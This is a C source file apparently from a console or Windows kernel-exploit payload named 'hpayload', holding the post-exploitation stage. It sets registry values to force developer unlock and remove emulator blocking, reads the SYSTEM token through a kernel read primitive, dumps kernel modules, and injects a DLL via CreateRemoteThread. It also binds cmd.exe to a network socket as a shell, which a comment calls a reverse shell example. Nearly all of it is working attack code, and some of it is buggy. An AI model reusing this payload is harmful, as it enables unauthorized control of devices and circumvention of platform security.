#include "post_exploit.h"
#include "win_defs.h"
#include "ioring.h"
#include "util.h"

#include <stdio.h>
#include <Windows.h>
#include <lmcons.h>
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

void sock_log(SOCKET sock, char* msg) {
    send(sock, msg, strlen(msg), 0);
}

char* sock_read(SOCKET sock) {
    char msg[1024] = { 0 };
    recv(sock, msg, 1024, MSG_PEEK);
}

void spawn_cmd(SOCKET sock) {
    // Spawn CMD using the socket for input and output
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);
    while (1) {}
}



BOOL set_reg() {
    DWORD dwMode = 1;
    LRESULT lResult;
    BOOL ret = TRUE;
    lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock", "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode, sizeof(dwMode));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Appx", "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode, sizeof(dwMode));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    DWORD dwDevUnlock = 4;
    lResult = lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\SOFTWARE\\Microsoft\\SecurityManager", "InternalDevUnlock", REG_DWORD, &dwDevUnlock, sizeof(dwDevUnlock));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    DWORD dwValue = 0;
    RegSetKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsEnabled", REG_DWORD, &dwValue, sizeof(dwValue));
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsRestrictedExeSubstrings");
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsLogOnlyExeSubstrings");
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsPublisherPackageStrings");
    return ret;
}


int inject_dll(HANDLE hProcess, char* dllPath) {
    HMODULE hKernel32 = GetModuleHandle("KernelBase");
    if (!hKernel32)
        return -1;

    VOID* pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary)
        return -2;

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess,
        NULL,
        sizeof(dllPath) + 1,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (!pRemoteBuffer)
        return -3;

    if(!WriteProcessMemory(hProcess, pRemoteBuffer, dllPath, sizeof(dllPath) + 1, 0))
        return -4;

    HANDLE hRemoteThread = CreateRemoteThread(hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteBuffer,
        0,
        NULL);
    
    return 0;
}

int dump_kmodule2(SOCKET s, char* name, SYSTEM_MODULE_INFORMATION_ENTRY moduleInfo) {

    if (name == "ntoskrnl.exe") { // will take a look at once driver dumper works for normal drivers
        sock_log(s, "[?] Skipping ntoskrnl.exe (i think it does nifty shit)\n");
        return 1337;
    }

    CHAR ptr_msg[1024] = { 0 };

    SIZE_T headersSize = 4096/2; // should contain headers
    char* headersBuffer = (char*)malloc(headersSize);
    if (!headersBuffer) {
        sock_log(s, "[!] Failed to allocate headers buffer.\n");
        return 1;
    }

    sock_log(s, "[?] Reading headers... ");
    if (krnl_read(moduleInfo.Base, headersBuffer, headersSize) != 0) {
        sock_log(s, "Failed!\n");
        return 2;
    }
    sock_log(s, "Done!\n");

    char* dumpDirectory = "D:\\hpayload\\dumped_modules\\";
    size_t pathLen = strlen(dumpDirectory) + strlen(name) + 1;

    char* filePath = (char*)malloc(pathLen * sizeof(char));
    strcpy(filePath, dumpDirectory);
    strcat(filePath, name);

    FILE* file = fopen(filePath, "wb");
    if (!file) {
        sock_log(s, "[!] Failed to open output file.\n");
        free(headersBuffer);
        return 3;
    }

    if (fwrite(headersBuffer, 1, headersSize, file) != headersSize) {
        sock_log(s, "[!] Failed to write to output file.\n");
        fclose(file);
        free(headersBuffer);
        return 4;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)((char*)pDosHeader + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeaders = (PIMAGE_SECTION_HEADER)((char*)&pNtHeaders->OptionalHeader + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    sock_log(s, "[?] Dumping sections...\n");
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = &pSectionHeaders[i];
        UINT64 sectionStart = (UINT64)moduleInfo.Base + pSection->VirtualAddress;
        SIZE_T sectionSize = pSection->Misc.VirtualSize;

        if (strcmp(pSection->Name, "GFIDS") == 0 || strcmp(pSection->Name, ".rsrc") == 0 || strcmp(pSection->Name, ".reloc") == 0) {
            //sock_log(s, "[?] Skipping GFIDS.\n");
            sprintf_s(ptr_msg,
                sizeof(ptr_msg),
                "[?] Skipping %s (to avoid crash?)\n", pSection->Name);
            sock_log(s, ptr_msg);
            char* nullSection = (char*)calloc(sectionSize, 1);
            fwrite(nullSection, 1, sectionSize, file);
            free(nullSection);
            continue;
        }

        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[?] [%s/0x%llx/%zu]\n", pSection->Name, sectionStart, sectionSize);
        sock_log(s, ptr_msg);

        char* sectionBuffer = (char*)malloc(sectionSize);
        if (!sectionBuffer) {
            sock_log(s, "[!] Failed to allocation section buffer.\n");
            fclose(file);
            free(headersBuffer);
            return 5;
        }

        if (krnl_read(sectionStart, sectionBuffer, sectionSize) != 0) {
            sock_log(s, "[!] Failed to read section.\n");
            free(sectionBuffer);
            fclose(file);
            free(headersBuffer);
            return 6;
        }

        if (fwrite(sectionBuffer, 1, sectionSize, file) != sectionSize) {
            sock_log(s, "[!] Failed to write section to file\n");
            free(sectionBuffer);
            fclose(file);
            free(sectionBuffer);
            return 7;
        }

        free(sectionBuffer);
    }

    fclose(file);
    free(headersBuffer);
    return 0;
}


int dump_kmodule(SOCKET s, char* name, SYSTEM_MODULE_INFORMATION_ENTRY moduleInfo) {
   
    CHAR ptr_msg[1024] = { 0 };
    PVOID pRegBuffer = NULL;
    pRegBuffer = 0x65007500;
    char* dumpDirectory = "D:\\hpayload\\dumped_modules\\";

    IMAGE_DOS_HEADER dosHeader;


    int ret = ioring_read(pRegBuffer, (ULONG64)moduleInfo.Base, &dosHeader, sizeof(IMAGE_DOS_HEADER));
    if (ret != 0) {
        sock_log(s, "[!] ioring_read failed whilst reading DOS Header!\n");
        return 4;
    }
    if (!dosHeader.e_lfanew) {
        sock_log(s, "[!] Invalid DOS Header.\n");
        return 4;
    }
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) { // ignore dos header?
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[!] Invalid DOS Header signature: 0x%lx\n", dosHeader.e_magic);
        sock_log(s, ptr_msg);
        return 5;
    }
    sock_log(s, "[?] DOS Header read and validated.\n");
    if (name == "ntoskrnl.exe") { // will take a look at once driver dumper works for normal drivers
        sock_log(s, "[?] Skipping ntoskrnl.exe (i think it does nifty shit)\n");
        return 9;
    }

    IMAGE_NT_HEADERS ntHeader;
    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "[?] Reading NT Header from 0x%llx... ", (ULONG64)moduleInfo.Base + dosHeader.e_lfanew);
    sock_log(s, ptr_msg);
    krnl_read((ULONG64)((ULONG64)moduleInfo.Base + dosHeader.e_lfanew), &ntHeader, sizeof(IMAGE_NT_HEADERS));
    sock_log(s, "Done!\n");
    
    //char ntHexDump[4096*2] = { 0 };
    //hex_dump(&ntHeader, sizeof(ntHeader), ntHexDump);

    //sprintf_s(ptr_msg,
    //    sizeof(ptr_msg),
    //    "[?] NT Header dump:\n%s\n", ntHexDump);
    //sock_log(s, ptr_msg);

    if (ntHeader.Signature != IMAGE_NT_SIGNATURE) {
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[!] Invalid NT Header signature: 0x%lx\n", dosHeader.e_magic);
        sock_log(s, ptr_msg);
        return 6;
    }

    DWORD imageSize = ntHeader.OptionalHeader.SizeOfImage;
    if (!imageSize) {
        sock_log(s, "[!] Invalid image size.\n");
        return 6;
    }

    sock_log(s, "[?] NT Header read and validated.\n");

    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "[?] Image size: 0x%lx\n", imageSize);
    sock_log(s, ptr_msg);

    BYTE* pModuleBuffer = (BYTE*)VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pModuleBuffer == NULL) {
        sock_log(s, "[!] Failed to allocate module buffer.\n");
        return 2;
    }

    BYTE* testBuffer = (BYTE*)VirtualAlloc(NULL, 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    

    ULONG64 base = moduleInfo.Base;
    sock_log(s, "[!] Testing read.\n");
    krnl_read(base + 0xa000, testBuffer, 1);
    sock_log(s, "[!] Test read success, dumping.\n");
    char ntHexDump[4096*2] = { 0 };
    hex_dump(testBuffer, sizeof(testBuffer), ntHexDump);

    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "%s\n", ntHexDump);
    sock_log(s, ptr_msg);

    for (UINT32 page = 0x0; page < ntHeader.OptionalHeader.SizeOfImage; page += 0x1000) {
        if (page > 0x8000) // doing a little dump first, will fix this later
            break;
        ULONG64 readAddr = base + page;
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[?] Reading page from 0x%llx... ", readAddr);
        sock_log(s, ptr_msg);
        int res = krnl_read(readAddr, pModuleBuffer + page, 0x1000);
        sock_log(s, "Done!\n");
        if (res != 0) {
            sprintf_s(ptr_msg,
                sizeof(ptr_msg),
                "[!] Failed to read section: 0x%lx [ERR:0x%llx]\n", page, res);
            sock_log(s, ptr_msg);
        }
    }

    sock_log(s, "[?] horray.\n");

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBuffer;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[!] Invalid DOS Header signature: 0x%lx\n", pDosHeader->e_magic);
        sock_log(s, ptr_msg);
        VirtualFree(pModuleBuffer, imageSize, MEM_RELEASE);
        return 7;
    }

    sock_log(s, "[?] DOS Header validated.\n");

    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)(pModuleBuffer + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[!] Invalid NT Header signature: 0x%lx\n", pNtHeader->Signature);
        sock_log(s, ptr_msg);
        VirtualFree(pModuleBuffer, imageSize, MEM_RELEASE);
        return 8;
    }

    sock_log(s, "[?] NT Header validated.\n");

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeader);

    for (WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; ++i, section++) {

        section->PointerToRawData = section->VirtualAddress;
        section->SizeOfRawData = section->Misc.VirtualSize;

        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "[?] [%s] 0x%06lX (0x%06lX)\n", section->Name, section->PointerToRawData, section->SizeOfRawData);
        sock_log(s, ptr_msg);
    }

    sock_log(s, "[?] Done.\n");

    //char* dumpDirectory = "D:\\hpayload\\dumped_modules\\";

    size_t pathLen = strlen(dumpDirectory) + strlen(name) + 1;

    char* filePath = (char*)malloc(pathLen * sizeof(char));
    strcpy(filePath, dumpDirectory);
    strcat(filePath, name);

    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "[?] Writing to %s... ", filePath);
    sock_log(s, ptr_msg);
    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        sock_log(s, "Failed!\n");
        VirtualFree(pModuleBuffer, 0, MEM_RELEASE);
        return GetLastError();
    }
    sock_log(s, "Done!\n");

    if (!WriteFile(hFile, pModuleBuffer, 0x8000, NULL, NULL)) {
        VirtualFree(pModuleBuffer, 0, MEM_RELEASE);
        return GetLastError();
    }

    VirtualFree(pModuleBuffer, 0, MEM_RELEASE);
    CloseHandle(hFile);
    free(filePath);
    return 0;
}

void dump_kmodules(SOCKET sock) {
    //sock_log(sock, "[?] dump_kmodules\n");
    HANDLE f = CreateFileA("D:\\hpayload\\test.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    char* a = "hello";
    WriteFile(f, a, sizeof(a), NULL, NULL);
    CloseHandle(f);
    
    HANDLE hFile = CreateFile(
        L"D:\\hpayload\\dump_modules.txt",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        sock_log(sock, "[!] Unable to open D:\\hpayload\\dump_modules.txt, skipping kernel dump.\n");
        return;
    }

    char buffer[256];
    DWORD bytesRead;
    char line[256];
    int linePos = 0;

    CHAR ptr_msg[1024] = { 0 };

    CHAR* modules[64] = { 0 };
    int moduleCnt = 0;

    sock_log(sock, "[?] Reading requested modules... ");
    while (ReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        for (DWORD i = 0; i < bytesRead; i++) {
            if (buffer[i] == '\n') {
                line[linePos] = '\0';
                // potential overflow, i know, and i dont care
                modules[moduleCnt] = malloc(strlen(line) + 1);
                strcpy(modules[moduleCnt], line);
                moduleCnt++;
                linePos = 0;
            }
            else if (buffer[i] != '\r') {
                line[linePos++] = buffer[i];

                
            }
        }
    }

    if (linePos > 0) {
        line[linePos] = '\0'; // Null-terminate the last line if it doesn't end with a newline
        modules[moduleCnt] = malloc(strlen(line) + 1);
        strcpy(modules[moduleCnt], line);
        moduleCnt++;
    }
    
    sock_log(sock, "Done!\n");

    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "[?] Module count: %i\n", moduleCnt);
    sock_log(sock, ptr_msg);
    sock_log(sock, "[?] Requested modules:\n");
    for (int i = 0; i < moduleCnt; i++) {
        //if (!modules[i]) sock_log(sock, "shit\n");
        sprintf_s(ptr_msg, sizeof(ptr_msg), "   - %i:%s\n", i, modules[i]);
        sock_log(sock, ptr_msg);
    }

    CloseHandle(hFile);//

    

    sock_log(sock, "\n[?] Attempting to grab System Module Information... ");

    ULONG len = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    if (status != 0xC0000004) {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "ERROR!\nFailed querying sysinfo length, error code: 0x%llx\n", status);
        sock_log(sock, ptr_msg);
        return;
    }

    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(len);
    status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
    if (status) {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "ERROR!\nFailed to retrieve system module information, error code: 0x%llx\n", status);
        sock_log(sock, ptr_msg);
        free(pModuleInfo);
        return;
    }

    sock_log(sock, "Done!\n[?] time to grab modules :)\n");

    int dmpCnt = 0;
    for (ULONG i = 0; i < pModuleInfo->NumberOfModules; i++) {
        if (dmpCnt > moduleCnt)
            break;
        char* moduleName = strrchr(pModuleInfo->Module[i].ImageName, '\\');
        if (moduleName) {
            moduleName++; // Skip the backslash character
        }
        else {
            moduleName = pModuleInfo->Module[i].ImageName;
        }
        BOOL b = FALSE;
        for (int i2 = 0; i2 < moduleCnt; i2++) {
            if (_stricmp(moduleName, modules[i2]) == 0) {
                sprintf_s(ptr_msg,
                    sizeof(ptr_msg),
                    "    - %s\n        - base_addr: 0x%llx\n        - size: %lu\n",
                    moduleName,
                    pModuleInfo->Module[i].Base,
                    pModuleInfo->Module[i].Size);
                sock_log(sock, ptr_msg);
                int res = dump_kmodule2(sock, moduleName, pModuleInfo->Module[i]);
                //int res = 1;
                if (res == 0) {
                    sprintf_s(ptr_msg,
                        sizeof(ptr_msg),
                        "[?] %s -> D:\\dumped_modules\\%s\n",
                        moduleName,
                        moduleName);
                    sock_log(sock, ptr_msg);
                    b = TRUE;
                }
                else {
                    sprintf_s(ptr_msg,
                        sizeof(ptr_msg),
                        "[!] Failed to dump %s, error code: 0x%llx\n",
                        moduleName,
                        res);
                    sock_log(sock, ptr_msg);
                }
                dmpCnt++;
                break;
            }
            if (b)
                break;
        }
        
    }

    sock_log(sock, "[?] Finished.\n"); 
    free(pModuleInfo);



}

BOOL FileExists(LPCTSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock)
{
    CHAR msg[1024] = { 0 };
    //char username[UNLEN + 1];
    //DWORD username_len = UNLEN + 1;
    //GetUsername(username, &username_len);

    sock_log(sock, "-hpayload\n");
    
    // add process hollowing, dll injection and manual mapping!

    
    int data = 1;
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"OSDATA\\Software\\Microsoft\\SecurityManager",
        L"InternalDevUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] InternalDevUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
        L"AppModelUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AppModelUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\Appx",
        L"AllowDevelopmentWithoutDevLicense",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AllowDevelopmentWithoutDevLicense enabled.\n");
    
    //CreateFileW("C:/Windows/System32/testing.txt", GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

    
    
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CHAR ptr_msg[1024] = { 0 };

    SYSTEM_INFO sysInfo;
    
    GetSystemInfo(&sysInfo);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] System page size: %lu\n", sysInfo.dwPageSize);
    sock_log(sock, ptr_msg);

    
    ULONG len;
    aSYSTEM_BASIC_INFORMATION sysBasicInfo;
    NtQuerySystemInformation(SystemBasicInformation, &sysBasicInfo, sizeof(sysBasicInfo), &len);

    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] Krnl System page size: %lu\n", sysBasicInfo.PageSize);
    sock_log(sock, ptr_msg);


    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] Reading SysToken from 0x%llx.\n[?] Tokens for reference: [systok:0x%llx,systok2:%llx]\n", ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, get_sys_token(), get_systok2());
    sock_log(sock, ptr_msg);
    // kernel rw sanity check (debug purposes for my dumb ass)
    ULONG64 sysToken = 0;
    int readRes = ioring_read(0x65007500, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &sysToken, sizeof(ULONG64));

    if (sysToken != get_sys_token()) {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "[!] SysToken reads don't match! readRes: %i [0x%llx/0x%llx/0x%llx]\n", readRes, sysToken, get_sys_token(), get_systok2());
        sock_log(sock, ptr_msg);
    }
    
    dump_kmodules(sock);

    // kernel rw no longer needed, so do some laundry
    ioring_cleanup();

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "D:\\", &sinfo, &pinfo);
    int res = inject_dll(pinfo.hProcess, "D:\\testdll.dll");
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] dll injection returned: %i\n", res);
    sock_log(sock, ptr_msg);



    while (1) {}
    while (1) {
        sock_log(sock, "> ");
        CHAR* input = sock_read(sock);
        if (input == "help\n") {
            sock_log(sock, "help -- guess\ncmd -- spawns cmd.exe (CANNOT EXIT)\nrun_dotnet_payload [path] -- runs a .NET payload\n");
        }
        if (input == "cmd\n") {
            spawn_cmd(sock);
        }
        if (input == "cmd_inj\n") {
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;

            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = STARTF_USESTDHANDLES;
            sinfo.hStdError = (HANDLE)sock;
            sinfo.hStdInput = (HANDLE)sock;
            sinfo.hStdOutput = (HANDLE)sock;

            CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "D:\\", &sinfo, &pinfo);
            inject_dll(pinfo.hProcess, "D:\\testdll.dll");
        }
        input = NULL;
    }
    spawn_cmd(sock);
    
}
